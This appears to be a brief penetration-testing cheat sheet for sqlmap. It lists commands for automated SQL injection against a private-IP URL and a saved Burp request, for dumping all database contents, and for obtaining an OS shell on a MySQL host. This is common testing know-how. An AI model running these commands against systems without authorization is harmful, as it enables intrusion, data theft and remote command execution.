# sqlmap

## level and risk options
--level 5
--risk 3

## search string response on site for successful injection
--string "successful injection text here"

## Test All (Default Settings)
```bash
-u "http://192.168.0.1/database/inject.php?q=user" --batch
```

## Test All (Default Settings, High Stress)
```bash
-u "http://192.168.0.1/database/inject.php?q=user" --batch --level=5 --risk=3
```

## with burp request Test All (Default Settings)
```bash
--all -r post_request.txt --batch 
```

## with burp request Test All (Default Settings, High Stress)
```bash
--all -r post_request.txt --batch --level=5 --risk=3
```

## with burp request Get A Reverse Shell (MySQL)
```bash
-r post_request.txt --dbms "mysql" --os-shell
```
